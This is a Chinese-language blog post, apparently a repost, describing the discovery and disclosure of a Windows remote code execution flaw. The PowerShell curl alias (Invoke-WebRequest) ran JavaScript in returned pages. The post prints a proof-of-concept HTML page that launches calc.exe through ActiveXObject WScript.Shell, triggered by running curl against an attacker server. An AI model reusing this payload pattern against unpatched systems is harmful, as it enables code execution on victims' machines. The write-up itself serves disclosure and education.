#  我是如何发现一个 Windows RCE 的  
haidragon  安全狗的自我修养   2026-01-08 04:04  
  
# 官网：http://securitytech.cc/  
##   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFAVdQich7RQsdNyh3Ezic3I2pH63fXPd2YCiabQkC69ibm96vvNlyES2Scc3dBcyEticP903FgAN4EEOw/640?wx_fmt=png&from=appmsg "")  
  
没错，你刚刚在标题中看到的内容是真的——我确实和其他很多研究人员一起，在 **Windows 11 最新版本**  
 上发现了一个**相当恐怖的远程代码执行（RCE）漏洞**  
！  
  
  
## 引言（Introduction）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vBZcZNVQERFAVdQich7RQsdNyh3Ezic3I2Wfx78IlmGpHugMppRnYFicrPmXOy9j719r9EuRm7ic1zYnWMlK7VPNibg/640?wx_fmt=jpeg&from=appmsg "")  
  
在这一切发生之前，我正在和 **Daniel Stenberg**  
（**libcurl**  
 的作者）进行一次采访。  
  
libcurl 是一个被广泛使用的工具。  
  
我们当时在讨论 **Bug Bounty 项目中的一些问题**  
，并拿 HackerOne 上一个“糟糕报告”作为例子——这是他们几乎每天都会收到的那种低质量报告之一。  
  
然而，这个报告本身**非常奇怪**  
，它暴露了一个相当诡异的问题。  
  
按回车或点击查看大图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFAVdQich7RQsdNyh3Ezic3I2By7ibicCrEuuaTKJhmkGdKl5icYgWQxgwNDZU7rpz2hgmbyH6kibv9PP5g/640?wx_fmt=png&from=appmsg "")  
  
乍一看就能发现，这**和真正的 curl 毫无关系**  
，而是因为 **PowerShell 里存在一个同名的 curl 别名（alias）**  
。  
  
报告者提到 --version  
 参数无法使用，这是因为 PowerShell 里的这个 curl **根本不是 libcurl**  
，行为完全不同。  
  
然而，当我第一次看到这个报告时，**复现步骤却让我产生了极大的兴趣**  
。  
  
按回车或点击查看大图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFAVdQich7RQsdNyh3Ezic3I26VZfx7xujbj8rmY2WthW04C2rctrz7bMMcxiaZfnlibzgg3OrD1ZtzzQ/640?wx_fmt=png&from=appmsg "")  
  
假设你在本地 localhost:5000  
 上部署了一个 Web 应用，只返回如下 HTML：  
```
<script>  alert(1);</script>
```  
  
然后在 PowerShell 中输入：  
```
curl http://localhost:5000
```  
  
结果是——  
**alert(1) 被执行了**  
，并且你会看到一个非常诡异的弹窗！  
  
按回车或点击查看大图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFAVdQich7RQsdNyh3Ezic3I2GrPJGBVoic5h8gPM99Q5qwIDc3qrsib7WvCJAuZichiawFszU3Dsib5vMuA/640?wx_fmt=png&from=appmsg "")  
  
这对我来说简直是匪夷所思。  
  
我完全无法理解，**为什么在 Windows 上，仅仅执行一个命令行 curl，就会执行返回的 JavaScript**  
。  
  
这太离谱了。  
  
但我并没有停下测试，而是继续深入研究——  
  
我想看看，这玩意**还能干到什么程度**  
。  
## 漏洞本身（RCE）  
  
按回车或点击查看大图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFAVdQich7RQsdNyh3Ezic3I26tSKdxS5qJHU3k7LPdIicseLq5MGrehNnEuIBzmRH44ex3Gb2iadJnibw/640?wx_fmt=png&from=appmsg "")  
  
几天后，经过多轮测试，我终于构造出了一个 **完整的 RCE PoC**  
。  
  
攻击方式非常简单：  
  
部署一个恶意 Web 页面，返回如下 JavaScript 代码：  
```
<html><head><title>CVE-2025-54100 PoC</title><metahttp-equiv="X-UA-Compatible"content="IE=10" /></head><body><h1>PoC</h1><script>try {newActiveXObject("WScript.Shell").Run("calc.exe");return;          } catch(e) {}try {newActiveXObject("Shell.Application").ShellExecute("calc.exe", "", "", "open", 1);return;          } catch(e) {}      }</script></body></html>
```  
  
随后，只要用户在 PowerShell 中执行：  
```
curl http://攻击者服务器
```  
  
**计算器就会直接弹出来。**  
  
是的——  
**远程代码执行，成功了。**  
## 漏洞披露（Vulnerability Disclosure）  
  
按回车或点击查看大图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFAVdQich7RQsdNyh3Ezic3I24nEQIoArvrrOuZuXQ2kx7TtUKuItVG64DlgeiclB5wPmnibd2lNjic7jA/640?wx_fmt=png&from=appmsg "")  
  
漏洞上报后，仅仅过了几天，微软就完成了修复，这个问题已经不再存在。  
  
虽然修复方式多少有点“值得商榷”，但至少**问题被解决了**  
。  
  
一共有 **5 位研究人员**  
 独立发现了这个漏洞，非常感谢大家的努力——你们真的很棒！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERFAVdQich7RQsdNyh3Ezic3I2lTb71bibWqtw27zK9ibTTHZsX4EKHYKQhL5xw4QJjW1qnSPDRKtMs1XA/640?wx_fmt=png&from=appmsg "")  
  
你可以在这里看到所有研究人员的信息，如果你想自己验证，这里也有相关链接。  
  
如果你想看**完整分析视频**  
，也可以去我的 YouTube 频道。  
## 这个问题为什么会存在？  
  
根本原因在于：  
**Windows PowerShell 里的 curl，实际上调用的是 Invoke-WebRequest**  
。  
  
而 Invoke-WebRequest**居然会解析并执行返回的 JavaScript**  
。  
  
说实话，这设计简直离谱。  
  
但现实就是这样——  
  
如果直接移除它会破坏操作系统的一大堆兼容性，那就只能在上面“打补丁式防护”。  
  
我们有时确实不得不依赖这些**古老又不安全的代码**  
，  
  
这也是为什么这种**愚蠢却严重的高危漏洞**  
仍然会存在。  
  
因为，我们已经无法彻底推翻那些早期、天真的设计错误了。  
- 公众号:安全狗的自我修养  
  
- vx:2207344074  
  
- http://  
gitee.com/haidragon  
  
- http://  
github.com/haidragon  
  
- bilibili:haidragonx  
  
##   
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vBZcZNVQERGSzyW3b031xvXsmDRaRf6I0Dxcibw3a8Tyt6wiagq0NCTlTDlwawQiacX8k13jcF30pHoJXPrh5AhAQ/640?wxfrom=5&wx_fmt=jpg&watermark=1&wx_lazy=1&tp=webp#imgIndex=34 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=z84f6pb5&tp=webp#imgIndex=5 "")  
  
****- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=omk5zkfc&tp=webp#imgIndex=5 "")  
  
